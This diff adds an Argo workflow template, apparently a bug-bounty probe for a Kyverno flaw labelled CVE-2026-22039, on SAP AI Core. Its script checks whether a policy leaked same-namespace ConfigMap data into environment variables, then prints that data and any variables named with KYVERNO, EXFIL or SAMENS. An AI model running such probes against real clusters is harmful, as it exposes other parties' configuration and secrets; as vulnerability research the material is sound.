@@ -1,0 +1,42 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v12
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v12"
+    executables.ai.sap.com/description: "CVE-2026-22039 step 2: same-namespace apiCall test"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import os
+
+        def report(k, v):
+            print(f"[PT12] {k}: {str(v)[:50000]}", flush=True)
+
+        report("START", "probe-train-v12 - same-namespace apiCall test")
+
+        samens = os.environ.get("KYVERNO_SAMENS_CONFIGMAPS", "")
+
+        if samens:
+            report("SAMENS_APICALL_STATUS", "WORKS -- same-namespace apiCall fired")
+            report("OWN_CONFIGMAPS", samens)
+        else:
+            report("SAMENS_APICALL_STATUS", "NOT_FIRED -- policy may not have applied or context.apiCall blocked entirely")
+
+        for k in sorted(os.environ):
+            if "KYVERNO" in k or "EXFIL" in k or "SAMENS" in k:
+                report(f"ENV_{k}", os.environ[k][:5000])
+
+        report("DONE", "probe-train-v12 complete")
+        EOF
+  entrypoint: probe
